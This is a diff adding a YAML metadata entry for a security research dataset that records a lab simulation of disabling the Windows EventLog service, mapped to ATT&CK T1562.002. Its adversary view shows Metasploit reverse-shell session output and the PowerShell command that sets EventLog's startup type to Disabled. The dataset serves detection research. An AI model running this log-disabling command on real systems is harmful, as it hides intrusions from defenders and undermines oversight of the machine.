@@ -1,0 +1,67 @@
+title: Stopping Event Log Service via Modification of Start Up Type
+id: SDWIN-220708104215
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2022/07/08
+modification_date: 2022/07/08
+platform:
+- Windows
+type: atomic
+tags:
+- powershell
+- eventlog
+description: |-
+  After getting a shell with elevated privileges on the target, we used powershell.exe to modify the start up type for the EventLog service to `Disabled`.
+  
+  After the modification, we need to restart our system to make the EventLog service unavailable (Stopped). This data set contains only before-reboot data of our simulation.
+
+  Even though after-reboot data is not part of the dataset, our attempt to stop the EventLog service was successful during the simulation.
+
+  This dataset was generated using a Windows 10 Enterprise Evaluation edition (Version:21H1,OS Build:19043.1766) and Kali Linux (Version:2021.3).
+attack_mappings:
+  - technique: T1562
+    sub-technique: "002"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_eventlog_service_start_up_type_modification.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script:
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    msf6 exploit(multi/handler) > run 
+
+    [*] Started HTTPS reverse handler on https://10.0.10.104:8443 
+    [*] https://10.0.10.104:8443 handling request from 10.0.10.105; (UUID: a7msjjkx) Staging x64 payload (201308 bytes) ... 
+    [*] Meterpreter session 2 opened (10.0.10.104:8443 -> 127.0.0.1) at 2022-07-08 07:29:02 -0400 
+
+    meterpreter > shell 
+
+    Process 7904 created. 
+    Channel 1 created. 
+    Microsoft Windows [Version 10.0.19043.1766] 
+    (c) Microsoft Corporation. All rights reserved. 
+
+    C:\Users\pedro\Downloads>powershell 
+
+    powershell
+    Windows PowerShell 
+    Copyright (C) Microsoft Corporation. All rights reserved. 
+    Try the new cross-platform PowerShell https://aka.ms/pscore6 
+
+    PS C:\Users\pedro\Downloads> Set-Service -Name EventLog -StartUpType Disabled 
+
+    Set-Service -Name EventLog -StartUpType Disabled 
+
+    PS C:\Users\pedro\Downloads> 
+
+references:
+- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
